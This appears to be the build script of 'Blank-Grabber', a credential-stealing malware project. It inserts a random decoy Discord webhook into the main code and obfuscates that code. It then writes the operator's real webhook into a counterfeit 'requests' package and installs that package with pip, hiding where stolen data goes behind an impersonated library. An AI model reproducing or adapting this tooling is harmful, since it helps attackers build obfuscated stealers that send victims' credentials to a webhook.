import base64, codecs, string, random, subprocess
with open("main.py", encoding="utf-8") as file:
    code = file.read().replace('WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"', f"WEBHOOK = \"https://discord.com/api/webhooks/{''.join(random.choices(string.digits, k= 18))}/{''.join(random.choices(string.ascii_letters + string.digits, k= 68))}\"")

with open("main-o.py", "w", encoding="utf-8") as file:
    file.write(code)

with open("config.txt") as config:
    hook = config.read()
subprocess.run("python obf.py -o main-o.py main-o.py", shell= True, capture_output= True)

with open("./module/requests/__init__.py", "w", encoding= "utf-8") as file:
    file.write(f'__author__ = "Blank-c"\n__github__ = "https://github.com/Blank-c/Blank-Grabber"\nWEBHOOK = "{hook}"')

subprocess.run("pip install -e .", shell= True, capture_output= True, cwd= "./module")